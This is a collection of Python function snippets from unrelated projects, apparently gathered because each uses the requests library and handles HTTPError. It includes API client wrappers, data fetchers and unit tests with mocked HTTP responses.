                                .format(time_series_id=self.sensor_id))
        response.raise_for_status()
        time_series_data = response.json()
        last_measurement = time_series_data["lastValue"]
        return last_measurement 
**************************************
def test_extract_link(self):
        success_response = {'success': True, 'data': 'link'}
        responses.add(responses.POST, constants.ENDPOINTS['extract_link'],
                      json=success_response,
                      status=200)
        responses.add(responses.POST, constants.ENDPOINTS['extract_link'],
                      status=401)
        # success call
        result = utils.extract_link(self.session, 'https://www.ojbk.com')
        self.assertEqual(result, 'link')
        self.assertEqual(len(responses.calls), 1)
        self.assertEqual(responses.calls[0].request.url, constants.ENDPOINTS['extract_link'])
        self.assertEqual(responses.calls[0].response.json(), success_response)
        # failed call
        with self.assertRaises(requests.HTTPError) as cm:
            utils.extract_link(self.session, 'https://www.ojbk.com')
        self.assertEqual(len(responses.calls), 2)
        self.assertEqual(cm.exception.response.status_code, 401) 
**************************************
def test_create_my_post(self):
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True, 'data': {}}
        mock_response.raise_for_status.return_value = None
        self.mock_jike_session.post.return_value = mock_response
        result = self.jike_client.create_my_post('jike')
        self.assertIsInstance(result, tuple)
        # failed by post no string content
        with self.assertRaises(AssertionError):
            self.jike_client.create_my_post(123)
        # failed call by post both link and picture at one time
        with self.assertRaises(ValueError):
            self.jike_client.create_my_post('jike', link='a', pictures='b')
        mock_response.reset_mock()
        # failed call by post failed
        mock_response.json.return_value = {'success': False}
        with self.assertRaises(RuntimeError):
            self.jike_client.create_my_post('jike')
        # failed call by server error
        mock_response.status_code = 401
        mock_response.raise_for_status.side_effect = requests.HTTPError()
        with self.assertRaises(requests.HTTPError):
            self.jike_client.create_my_post('jike') 
**************************************
def test_delete_my_post(self):
        mock_message = Mock()
        mock_message.type = 'ORIGINAL_POST'
        mock_message.id = '123'

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        self.mock_jike_session.post.return_value = mock_response
        result = self.jike_client.delete_my_post(mock_message)
        self.assertTrue(result)
        # failed call by no post id provided
        with self.assertRaises(AssertionError):
            self.jike_client.delete_my_post(None)
        # failed call by server error
        mock_response.status_code = 403
        mock_response.raise_for_status.side_effect = requests.HTTPError()
        with self.assertRaises(requests.HTTPError):
            self.jike_client.delete_my_post(mock_message) 
**************************************
def test__collect_action(self):
        mock_message = Mock()
        mock_message.type = 'OFFICIAL_MESSAGE'
        mock_message.id = '123'

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True}
        mock_response.raise_for_status.return_value = None
        self.mock_jike_session.post.return_value = mock_response
        result = self.jike_client._collect_action(mock_message, 'collect_it')
        self.assertTrue(result)
        # failed call by assertion
        mock_message.type = ''
        with self.assertRaises(AssertionError):
            self.jike_client._collect_action(mock_message, 'uncollect_it')
        # failed by server error
        mock_message.type = 'ORIGINAL_POST'
        mock_response.status_code = 403
        mock_response.raise_for_status.side_effect = requests.HTTPError()
        with self.assertRaises(requests.HTTPError):
            self.jike_client._collect_action(mock_message, 'collect_it') 
**************************************
def _update_case_description(self, attributes: JsonDict, case_id: str, name: str,
                                 references: Optional[str]) -> None:
        """ Update test case description in TestRail

        *Args:* \n
            _attributes_ - attributes of test case in Robot Framework;\n
            _case_id_ - case id;\n
            _name_ - test case name;\n
            _references_ - test references.
        """
        logger.info(f"[TestRailListener] update of test {case_id} in TestRail")
        description = f"{attributes['doc']}\nPath to test: {attributes['longname']}"
        request_fields: Dict[str, Union[str, int, None]] = {
            'title': name, 'type_id': self.TESTRAIL_CASE_TYPE_ID_AUTOMATED,
            'custom_case_description': description, 'refs': references}
        try:
            json_result = self.tr_client.update_case(case_id, request_fields)
            result = json.dumps(json_result, sort_keys=True, indent=4)
            logger.info(f"[TestRailListener] result for method update_case: {result}")
        except requests.HTTPError as error:
            logger.error(f"[TestRailListener] http error, while execute request:\n{error}") 
**************************************
def api_call_get(self, url, data=None):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.get(cf_api_url + url, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        return api_result 
**************************************
def api_call_post(self, url, data=None):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.post(cf_api_url + url, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        return api_result 
**************************************
def api_call_delete(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.delete(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if not api_result['success']:
            raise self.APIError(api_result['errors'])
        return api_result 
**************************************
def api_call_patch(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.patch(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        return api_result 
**************************************
def api_call_put(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.put(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        elif api_result['errors']:
            raise self.APIError(str(api_result['errors']))
        return api_result

    ################################################################
    #  Zone (https://api.cloudflare.com/#zone)                     #
    ################################################################

    #  Get all zones 
**************************************
def test_location_google_breaks(self):
        """User passed location arg but google api gave error"""
        caught_exceptions = [
            requests.ConnectionError, requests.HTTPError, requests.Timeout]
        with mock.patch('requests.get') as mock_get:
            for exception in caught_exceptions:
                mock_get.side_effect = exception
                with capture_sys_output():
                    with self.assertRaises(RipeAtlasToolsException):
                        cmd = Command()
                        cmd.init_args(["--location", "blaaaa"])
                        cmd.run()
            mock_get.side_effect = Exception()
            with self.assertRaises(Exception):
                cmd = Command()
                cmd.init_args(["--location", "blaaaa"])
                cmd.run() 
**************************************
def lookup_index(index_name):
    if index_name is None:
        return None

    error = None
    for base in [INDEX_BASE, OLD_INDEX_BASE]:
        idx_url = INDEX_BASE + "task/" + index_name
        resp = requests.get(idx_url)
        try:
            resp.raise_for_status()
        except requests.HTTPError as e:
            error = e
            continue
        error = None
        idx = resp.json()
        task_id = idx.get("taskId")
        break

    if error:
        raise error
    if task_id:
        return task_id
    logger.warning("Task not found from index: %s\n%s" % (index_name, idx.get("message", "")))
    return task_id 
**************************************
def add_wpt_fyi_data(sync, results):
    head_sha1 = sync.wpt_commits.head.sha1

    logs = []
    for target, run_has_changes in [("base", False),
                                    ("head", True)]:
        target_results = defaultdict(dict)
        try:
            runs = wptfyi.get_runs(sha=head_sha1, labels=["pr_%s" % target])
            for run in runs:
                if run["browser_name"] in browsers:
                    browser = run["browser_name"]
                    target_results[browser]["GitHub"] = [requests.get(run["raw_results_url"])]
        except requests.HTTPError as e:
            logger.error("Unable to fetch results from wpt.fyi: %s" % e)
            return False

        logs.append(target_results)
    results.add_jobs_from_log_files(*logs)
    results.wpt_sha = head_sha1
    return True 
**************************************
def from_uri(
    uri: str,
    base_url: Optional[str] = None,
    method: Optional[Filter] = None,
    endpoint: Optional[Filter] = None,
    tag: Optional[Filter] = None,
    *,
    app: Any = None,
    **kwargs: Any,
) -> BaseSchema:
    """Load a remote resource and parse to schema instance."""
    kwargs.setdefault("headers", {}).setdefault("User-Agent", USER_AGENT)
    response = requests.get(uri, **kwargs)
    try:
        response.raise_for_status()
    except requests.HTTPError:
        raise HTTPError(response=response, url=uri)
    if base_url is None:
        base_url = get_base_url(uri)
    return from_file(response.text, location=uri, base_url=base_url, method=method, endpoint=endpoint, tag=tag, app=app) 
**************************************
def from_wsgi(
    schema_path: str,
    app: Any,
    base_url: Optional[str] = None,
    method: Optional[Filter] = None,
    endpoint: Optional[Filter] = None,
    tag: Optional[Filter] = None,
) -> BaseSchema:
    client = Client(app, WSGIResponse)
    response = client.get(schema_path, headers={"User-Agent": USER_AGENT})  # type: ignore
    # Raising exception to provide unified behavior
    # E.g. it will be handled in CLI - a proper error message will be shown
    if 400 <= response.status_code < 600:
        raise HTTPError(response=response, url=schema_path)
    return from_file(
        response.data, location=schema_path, base_url=base_url, method=method, endpoint=endpoint, tag=tag, app=app
    ) 
**************************************
def resolve_short_url(url):
    if url=='':
        return graph_nodes['tweetWithoutURL']
        
    try:
        #Follow the redirections of a URL
        r = requests.head(url, allow_redirects='HEAD', timeout=url_timeout)
        if r.status_code != 403:            
            r.raise_for_status()

        #Avoid blacklisted and flat URLs
        domain, path = analyze_url(r.url)
        if domain in blacklistURLs or path in ['', '/']:
            r.url = ''

        return re.sub('\?.*', '', re.sub('^http://', 'https://', r.url))

    #Catch the different errors       
    except requests.HTTPError as e:
        return graph_nodes['HTTPError']
    except:
        return graph_nodes['TimeoutError']

#Get outgoing links from article 
**************************************
def test_acl_forbidden(self):
        """
        Testing Consul Integration
        """

        config = {
            "instances": [{
                'url': 'http://localhost:8500',
                'catalog_checks': True,
                'network_latency_checks': True,
                'new_leader_checks': True,
                'catalog_checks': True,
                'self_leader_check': True,
                'acl_token': 'wrong_token'
            }]
        }
        got_error_403 = False
        try:
            self.run_check(config)
        except HTTPError as e:
            if e.response.status_code == 403:
                got_error_403 = True

        self.assertTrue(got_error_403) 
**************************************
def user_data(self, access_token, *args, **kwargs):
        data = self._user_data(access_token)
        try:
            emails = self._user_data(access_token, '/emails')
        except (HTTPError, ValueError, TypeError):
            emails = []

        emails = [(e.get('email'), e.get('primary'), 0) for e in emails if isinstance(e, dict) and e.get('verified')]
        emails.sort(key=itemgetter(1), reverse=True)
        emails = map(itemgetter(0), emails)

        if emails:
            data['email'] = emails[0]
        else:
            data['email'] = None

        return data 
**************************************
def show_manifest(self, client, repository, ref):
        try:
            repo = client.repository(repository)
        except requests.HTTPError as e:
            if e.response.status_code == requests.codes.not_found:
                print("Repository {0} not found".format(repository))
            else:
                raise
        else:
            assert client.api_version in [1, 2]
            if client.api_version == 2:
                manifest, digest = repo.manifest(ref)
                print("Digest: {0}".format(digest))
                print("Manifest:")
                print(json.dumps(manifest, indent=2, sort_keys=True))
            else:
                image = repo.image(ref)
                image_json = image.get_json()
                print("Image ID: {0}".format(image.image_id))
                print("Image JSON:")
                print(json.dumps(image_json, indent=2, sort_keys=True)) 
**************************************
def _reportable_http_errors(location):
    try:
        yield
    except requests.exceptions.HTTPError as ex:
        # E.g. we can see 404 errors if packages were deleted
        # without updating the repodata.
        #
        # Future: If we see lots of transient error status codes
        # in practice, we could retry automatically before
        # waiting for the next snapshot, but the complexity is
        # not worth it for now.
        raise HTTPError(
            location=location,
            http_status=ex.response.status_code,
        ) 
**************************************
def _get_data(self):
        try:
            res = requests.get('http://dynamisch.citybikewien.at/citybike_xml.php')
        except RequestException or HTTPError:  # retry on error
            logger.error("Caught RequestException")
            res = requests.get('http://dynamisch.citybikewien.at/citybike_xml.php')
        res.raise_for_status()
        root = ET.fromstring(res.text)
        citybikewien_data = []

        # extract only wanted stations and parse to citybikewien dict
        conf = get_config()
        stations = conf['api']['citybikewien']['stations']
        for station_xml in root.findall('station'):
            if station_xml.find('id').text in list(map(lambda s: str(s['id']), stations)):
                citybikewien_data.append({
                    'id': station_xml.find('id').text,
                    'name': station_xml.find('name').text,
                    'bikes': station_xml.find('free_bikes').text,
                    'status': station_xml.find('status').text
                })

        # rename stations to names from config, so they can be mapped with other api data by name
        for conf_station in stations:
            if 'rename' in conf_station:
                for station in citybikewien_data:
                    if station['id'] == str(conf_station['id']):
                        station['name'] = conf_station['rename']
                        break

        logger.info("updated data: %s" % citybikewien_data)
        self.data = citybikewien_data 
**************************************
def _new_session(self):
        self.header = {'Channel': 'inet'}
        try:
            res = requests.get('https://tickets.oebb.at/api/domain/v3/init',
                               headers=self.header,
                               params={'userId': 'anonym-%s-%s-%s' % (_gen_rnd_str(8), _gen_rnd_str(4), _gen_rnd_str(2))})
        except RequestException or HTTPError:  # retry on error
            res = requests.get('https://tickets.oebb.at/api/domain/v3/init',
                               headers=self.header,
                               params={'userId': 'anonym-%s-%s-%s' % (_gen_rnd_str(8), _gen_rnd_str(4), _gen_rnd_str(2))})
        res.raise_for_status()
        auth = res.json()
        logger.debug('autenticated: %s' % auth)
        self.header.update(
            {'AccessToken': auth['accessToken'], 'SessionId': auth['sessionId'], 'x-ts-supportid': auth['supportId']})
        self.session_end = time.time() + auth['sessionTimeout'] 
**************************************
def test_get_error(self):
        self.adapter.register_uri('GET', '/api/api', json=self.test_error, status_code=404)
        with self.assertRaises(requests.HTTPError):
            self.connection.get(ResourceType.API, MediaType.API) 
**************************************
def test_get_error_plain(self):
        self.adapter.register_uri('GET', '/api/api', json={'test': 'a'}, status_code=404)
        with self.assertRaises(requests.HTTPError):
            self.connection.get(ResourceType.API, MediaType.API) 
**************************************
def test_get_plain_error(self):
        self.adapter.register_uri('GET', '/api/api', json=self.test_error, status_code=404)
        with self.assertRaises(requests.HTTPError):
            self.connection.get_plain(ResourceType.API, MediaType.API) 
**************************************
def test_put_error(self):
        self.adapter.register_uri('PUT', '/api/api', json=self.test_error, status_code=404)
        with self.assertRaises(requests.HTTPError):
            self.connection.put(ResourceType.API, MediaType.API, data={'test': 'data'}) 
**************************************
def test_delete_error(self):
        self.adapter.register_uri('DELETE', '/api/api', json=self.test_error, status_code=404)
        with self.assertRaises(requests.HTTPError):
            self.connection.delete(ResourceType.API, MediaType.API, data={'test': 'data'}) 
**************************************
def get(self, resource_type, media_type, path=None, params=None):
        url = _format_url(self.host, resource_type, path, self.ssl)
        response = self.session.get(
            url,
            verify=self.verify_ssl,
            headers=self._get_headers(media_type),
            params=params)
        try:
            response.raise_for_status()
            return response.json()
        except requests.HTTPError:
            logger.error('Failed on request %s', url)
            message = _format_error_message(response)
            logger.error(message)
            raise 
**************************************
def get_plain(self, resource_type, media_type, path=None, params=None):
        url = _format_url(self.host, resource_type, path, self.ssl)
        response = self.session.get(
            url,
            verify=self.verify_ssl,
            headers=self._get_headers(media_type),
            params=params)
        try:
            response.raise_for_status()
            return response.text
        except requests.HTTPError:
            logger.error('Failed on request %s', url)
            logger.error(_format_error_message(response))
            raise 
**************************************
def get_session(self, session_id: int) -> Optional[Session]:
        """Get information about a session.

        :param session_id: The ID of the session.
        """
        try:
            data = self._client.get(f"/sessions/{session_id}")
        except requests.HTTPError as e:
            if e.response.status_code == 404:
                return None
            else:
                raise
        return Session.from_json(data) 
**************************************
def download_file(self, report_url, file_name):
        """
        Downloads the file pointed by URL.

        Args:
        
            report_url (str): URL returned from API from which file can be downloaded
            file_name (str): Name to be used for downloaded file 
        """
        headers = {'content-type': 'application/json'}
    
        try:
            r = requests.get(report_url, headers=headers, verify=False, stream=True)
            if r.status_code != 200:
                message = "The HTTP response for get call on: %s is %s" % (report_url, r.status_code)
                raise TintriServerError(r.status_code, message=message)
    
            with open(file_name, 'w') as file_h:
                for block in r.iter_content(4096):
                    file_h.write(block)

        except TintriServerError:
            raise    
        except requests.ConnectionError:
            raise TintriError("API Connection error occurred.")
        except requests.HTTPError:
            raise TintriError("HTTP error occurred.")
        except requests.Timeout:
            raise TintriError("Request timed out.")
        except Exception as e:
            raise TintriError("An unexpected error occurred: " + e.__str__()) 
**************************************
def test_get_cities_bad_response(mock_responses):
        mock_responses.add(
            responses.RequestsMock.POST,
            mealpy.CITIES_URL,
            status=400,
        )

        with pytest.raises(requests.exceptions.HTTPError):
            mealpy.MealPal.get_cities() 
**************************************
def test_login_fail(mock_responses):
        mock_responses.add(
            method=responses.RequestsMock.POST,
            url=mealpy.LOGIN_URL,
            status=404,
            json={
                'code': 101,
                'error': 'An error occurred while blah blah, try agian.',
            },
        )

        mealpal = mealpy.MealPal()

        with pytest.raises(requests.HTTPError):
            mealpal.login('username', 'password') 
**************************************
def test_get_schedules_fail(mock_responses, mock_city):
        mock_responses.add(
            method=responses.RequestsMock.GET,
            url=mealpy.MENU_URL.format(mock_city.objectId),
            status=400,
        )

        with pytest.raises(requests.HTTPError):
            mealpy.MealPal.get_schedules(mock_city.name) 
**************************************
def test_fetch_more(self):
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'more': 'items'}
        mock_response.raise_for_status.return_value = None
        self.mock_session.post.return_value = mock_response
        self.assertEqual(self.fetcher.fetch_more(None, None), {'more': 'items'})
        mock_response.status_code = 404
        mock_response.raise_for_status.side_effect = requests.HTTPError
        with self.assertRaises(requests.HTTPError):
            self.fetcher.fetch_more(None, None) 
**************************************
def test_wait_login(self):
        success_response = {'logged_in': True}
        responses.add(responses.GET, constants.ENDPOINTS['wait_login'],
                      json=success_response, status=200)
        failed_response = {'logged_in': False}
        responses.add(responses.GET, constants.ENDPOINTS['wait_login'],
                      json=failed_response, status=200)
        responses.add(responses.GET, constants.ENDPOINTS['wait_login'],
                      status=500)
        uuid = {'uuid': '123'}
        # success call
        result = utils.wait_login(uuid)
        self.assertTrue(result)
        self.assertEqual(len(responses.calls), 1)
        self.assertEqual(responses.calls[0].request.url, constants.ENDPOINTS['wait_login'] + '?' + urlencode(uuid))
        self.assertEqual(responses.calls[0].response.json(), success_response)
        # failed call
        result = utils.wait_login(uuid)
        self.assertFalse(result)
        self.assertEqual(len(responses.calls), 2)
        self.assertEqual(responses.calls[1].request.url, constants.ENDPOINTS['wait_login'] + '?' + urlencode(uuid))
        self.assertEqual(responses.calls[1].response.json(), failed_response)
        # failed again call
        with self.assertRaises(requests.HTTPError) as cm:
            utils.wait_login(uuid)
        self.assertEqual(len(responses.calls), 3)
        self.assertEqual(cm.exception.response.status_code, 500) 
**************************************
def test_confirm_login(self):
        success_response = {'confirmed': True, 'token': 'token'}
        responses.add(responses.GET, constants.ENDPOINTS['confirm_login'],
                      json=success_response, status=200)
        failed_response = {'confirmed': False, 'token': 'token'}
        responses.add(responses.GET, constants.ENDPOINTS['confirm_login'],
                      json=failed_response, status=200)
        responses.add(responses.GET, constants.ENDPOINTS['confirm_login'],
                      status=502)
        uuid = {'uuid': '123'}
        # success call
        result = utils.confirm_login(uuid)
        self.assertEqual(result, 'token')
        self.assertEqual(len(responses.calls), 1)
        self.assertEqual(responses.calls[0].request.url, constants.ENDPOINTS['confirm_login'] + '?' + urlencode(uuid))
        self.assertEqual(responses.calls[0].response.json(), success_response)
        # failed call
        with self.assertRaises(SystemExit):
            utils.confirm_login(uuid)
        self.assertEqual(len(responses.calls), 2)
        self.assertEqual(responses.calls[1].request.url, constants.ENDPOINTS['confirm_login'] + '?' + urlencode(uuid))
        self.assertEqual(responses.calls[1].response.json(), failed_response)
        # failed again call
        with self.assertRaises(requests.HTTPError) as cm:
            utils.confirm_login(uuid)
        self.assertEqual(len(responses.calls), 3)
        self.assertEqual(cm.exception.response.status_code, 502) 
**************************************
def test_login(self):
        uuid = {'uuid': '123'}
        responses.add(responses.GET, constants.ENDPOINTS['create_session'],
                      json=uuid, status=200)
        responses.add(responses.GET, constants.ENDPOINTS['create_session'],
                      status=400)
        responses.add(responses.GET, constants.ENDPOINTS['create_session'],
                      json=uuid, status=200)
        responses.add(responses.GET, constants.ENDPOINTS['create_session'],
                      json=uuid, status=200)
        # success call
        with patch('jike.utils.wait_login', return_value=True), \
             patch('jike.utils.confirm_login', return_value='token'), \
             patch('jike.utils.make_qrcode'):
            result = utils.login()
        self.assertEqual(result, 'token')
        self.assertEqual(len(responses.calls), 1)
        self.assertEqual(responses.calls[0].request.url, constants.ENDPOINTS['create_session'])
        self.assertEqual(responses.calls[0].response.json(), uuid)
        # failed call
        with patch('jike.utils.wait_login', return_value=True), \
             patch('jike.utils.confirm_login', return_value='token'), \
             patch('jike.utils.make_qrcode'), \
             self.assertRaises(requests.HTTPError) as cm:
            utils.login()
        self.assertEqual(len(responses.calls), 2)
        self.assertEqual(cm.exception.response.status_code, 400)
        # failed call by `wait_login`
        with patch('jike.utils.wait_login', return_value=False), \
             patch('jike.utils.confirm_login', return_value='token'), \
             patch('jike.utils.make_qrcode'), \
             self.assertRaises(SystemExit):
            utils.login()
        self.assertEqual(len(responses.calls), 3)
        # failed call by `confirm_login`
        with patch('jike.utils.wait_login', return_value=True), \
             patch('jike.utils.confirm_login', return_value=None), \
             patch('jike.utils.make_qrcode'), \
             self.assertRaises(SystemExit):
            utils.login()
        self.assertEqual(len(responses.calls), 4) 
**************************************
def test_get_news_feed_unread_count(self):
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'newMessageCount': 0}
        self.mock_jike_session.get.return_value = mock_response
        result = self.jike_client.get_news_feed_unread_count()
        self.assertEqual(result, 0)
        self.assertEqual(self.jike_client.unread_count, 0)
        # failed call
        mock_response.status_code = 404
        mock_response.raise_for_status.side_effect = requests.HTTPError()
        with self.assertRaises(requests.HTTPError):
            self.jike_client.get_news_feed_unread_count() 
**************************************
def test_get_user_profile(self):
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'user': {'name': 'jike'}, 'statsCount': {'count': 1}}
        self.mock_jike_session.get.return_value = mock_response
        result = self.jike_client.get_user_profile('jike')
        self.assertEqual(result, self.mock_user)
        # failed call
        mock_response.status_code = 401
        mock_response.raise_for_status.side_effect = requests.HTTPError()
        with self.assertRaises(requests.HTTPError):
            self.jike_client.get_user_profile('jike') 
**************************************
def test_repost_it(self):
        mock_message = Mock()
        mock_message.type = 'OFFICIAL_MESSAGE'
        mock_message.id = '123'

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True, 'data': {}}
        mock_response.raise_for_status.return_value = None
        self.mock_jike_session.post.return_value = mock_response
        result = self.jike_client.repost_it('jike', mock_message)
        self.assertIsInstance(result, tuple)
        # failed by post no string content
        with self.assertRaises(AssertionError):
            self.jike_client.repost_it(123, mock_message)
        # failed call by assertion
        mock_message.type = ''
        with self.assertRaises(AssertionError):
            self.jike_client.repost_it('jike', mock_message)
        # failed call by post failed
        mock_message.type = 'ORIGINAL_POST'
        mock_response.json.return_value = {'success': False}
        with self.assertRaises(RuntimeError):
            self.jike_client.repost_it('jike', mock_message)
        # failed by server error
        mock_response.status_code = 403
        mock_response.raise_for_status.side_effect = requests.HTTPError()
        with self.assertRaises(requests.HTTPError):
            self.jike_client.repost_it('jike', mock_message) 
**************************************
def test_comment_it(self):
        mock_message = Mock()
        mock_message.type = 'OFFICIAL_MESSAGE'
        mock_message.id = '123'

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'success': True, 'data': {}}
        mock_response.raise_for_status.return_value = None
        self.mock_jike_session.post.return_value = mock_response
        result = self.jike_client.comment_it('jike', mock_message)
        self.assertIsInstance(result, tuple)
        # failed by post no string content
        with self.assertRaises(AssertionError):
            self.jike_client.comment_it(123, mock_message)
        # failed call by assertion
        mock_message.type = ''
        with self.assertRaises(AssertionError):
            self.jike_client.comment_it('jike', mock_message)
        # failed call by post failed
        mock_message.type = 'ORIGINAL_POST'
        mock_response.json.return_value = {'success': False}
        with self.assertRaises(RuntimeError):
            self.jike_client.comment_it('jike', mock_message)
        # failed by server error
        mock_response.status_code = 404
        mock_response.raise_for_status.side_effect = requests.HTTPError()
        with self.assertRaises(requests.HTTPError):
            self.jike_client.comment_it('jike', mock_message) 
**************************************
def end_test(self, name: str, attributes: JsonDict) -> None:
        """ Update test case in TestRail.

        *Args:* \n
            _name_ - name of test case in Robot Framework;\n
            _attributes_ - attributes of test case in Robot Framework.
        """
        tags_value = self._get_tags_value(attributes['tags'])
        case_id = tags_value['testrailid']

        if not case_id:
            logger.warn(f"[TestRailListener] No case_id presented for test_case {name}.")
            return

        if 'skipped' in [tag.lower() for tag in attributes['tags']]:
            logger.warn(f"[TestRailListener] SKIPPED test case \"{name}\" with testrailId={case_id} "
                        "will not be posted to Testrail")
            return

        # Update test case
        if self.update:
            references = tags_value['references']
            self._update_case_description(attributes, case_id, name, references)
        # Send test results
        defects = tags_value['defects']
        old_test_status_id = self.tr_client.get_test_status_id_by_case_id(self.run_id, case_id)
        test_result = self._prepare_test_result(attributes, defects, old_test_status_id, case_id)
        try:
            self.tr_client.add_result_for_case(self.run_id, case_id, test_result)
        except requests.HTTPError as error:
            logger.error(f"[TestRailListener] http error on case_id = {case_id}\n{error}") 
**************************************
def get_rpc_proto(lnd_version):
    try:
        url = f"https://raw.githubusercontent.com/lightningnetwork/lnd/{lnd_version}/lnrpc/rpc.proto"
        print(f"Connecting to: {url}")
        proto = requests.get(url)
    except requests.HTTPError as e:
        print(e)
        return

    # Write the proto file to the current working directory
    proto_file_name = cwd + "/" + "rpc.proto"
    proto_file = open(proto_file_name, "w")
    proto_file.write(proto.text)
    proto_file.close()

    # Test the written proto file
    proto_file = open(proto_file_name, "r")
    proto_file_first_line = proto_file.readline().strip()
    test_first_line = 'syntax = "proto3";'
    if proto_file_first_line == test_first_line:
        print("Proto file looks good")
    else:
        print(
            f"Proto file did not have expected first line\n"
            f"Expected: {test_first_line}\n"
            f"Read: {proto_file_first_line}\n"
            f"Exiting..."
        )
        return 
**************************************
def get_invoices_proto(lnd_version):
    try:
        url = f"https://raw.githubusercontent.com/lightningnetwork/lnd/{lnd_version}/lnrpc/invoicesrpc/invoices.proto"
        print(f"Connecting to: {url}")
        proto = requests.get(url)
    except requests.HTTPError as e:
        print(e)
        return

    # Write the proto file to the current working directory
    proto_file_name = cwd + "/" + "invoices.proto"
    proto_file = open(proto_file_name, "w")
    proto_file.write(proto.text)
    proto_file.close()

    # Test the written proto file
    with open(proto_file_name, "r") as proto_file:
        proto_file_first_line = proto_file.readline().strip()
        test_first_line = 'syntax = "proto3";'
        if proto_file_first_line == test_first_line:
            print("Proto file looks good")
        else:
            print(
                f"Proto file did not have expected first line\n"
                f"Expected: {test_first_line}\n"
                f"Read: {proto_file_first_line}\n"
                f"Exiting..."
            )
            return

    # Fix Line 4 import for lnd_grpc package
    temp = None
    with open(proto_file_name, "r") as proto_file:
        temp = proto_file.readlines()
        temp[3] = 'import "lnd_grpc/protos/rpc.proto";\n'
    with open(proto_file_name, "w") as proto_file:
        proto_file.writelines(temp) 
**************************************
def location2degrees(self):
        """Fetches degrees based on the given location."""
        error_log = (
            "Following error occured while trying to fetch lat/lon"
            "for location <{}>:\n{}"
        )
        goole_api_url = "http://maps.googleapis.com/maps/api/geocode/json"
        try:
            result = requests.get(goole_api_url, params={
                "sensor": "false",
                "address": self.arguments.location
            })
        except (
            requests.ConnectionError,
            requests.HTTPError,
            requests.Timeout,
        ) as e:
            error_log = error_log.format(self.arguments.location, e)
            raise RipeAtlasToolsException(error_log)

        result = result.json()

        try:
            lat = result["results"][0]["geometry"]["location"]["lat"]
            lng = result["results"][0]["geometry"]["location"]["lng"]
        except (KeyError, IndexError) as e:
            error = error_log.format(self.arguments.location, e)
            raise RipeAtlasToolsException(error)

        return str(lat), str(lng) 
**************************************
def _fetch_inventory(self, inventory_url: str, config: SphinxConfiguration) -> Optional[dict]:
        """Get and return inventory from `inventory_url`. If fetching fails, return None."""
        fetch_func = functools.partial(intersphinx.fetch_inventory, config, '', inventory_url)
        for retry in range(1, FAILED_REQUEST_RETRY_AMOUNT+1):
            try:
                package = await self.bot.loop.run_in_executor(None, fetch_func)
            except ConnectTimeout:
                log.error(
                    f"Fetching of inventory {inventory_url} timed out,"
                    f" trying again. ({retry}/{FAILED_REQUEST_RETRY_AMOUNT})"
                )
            except ProtocolError:
                log.error(
                    f"Connection lost while fetching inventory {inventory_url},"
                    f" trying again. ({retry}/{FAILED_REQUEST_RETRY_AMOUNT})"
                )
            except HTTPError as e:
                log.error(f"Fetching of inventory {inventory_url} failed with status code {e.response.status_code}.")
                return None
            except ConnectionError:
                log.error(f"Couldn't establish connection to inventory {inventory_url}.")
                return None
            else:
                return package
        log.error(f"Fetching of inventory {inventory_url} failed.")
        return None 
**************************************
def _download_file(self, url, local_filename, path, params=None):
        try:
            r = self.session.get(
                "{0}{1}".format(self.base_url, url), params=params
            )
            r.encoding = 'utf-8-sig'
            r.raise_for_status()
            with open(os.path.join(path, local_filename), "w", encoding='utf-8') as f:
                f.write(r.text)
            return local_filename
        except requests.HTTPError as e:
            raise PluralsightApiException(e) 
**************************************
def get(self, uri, params=None):
        try:
            result = self.session.get(
                "{0}/{1}".format(self.base_url, uri), params=params
            )
            result.raise_for_status()

            return result.json()
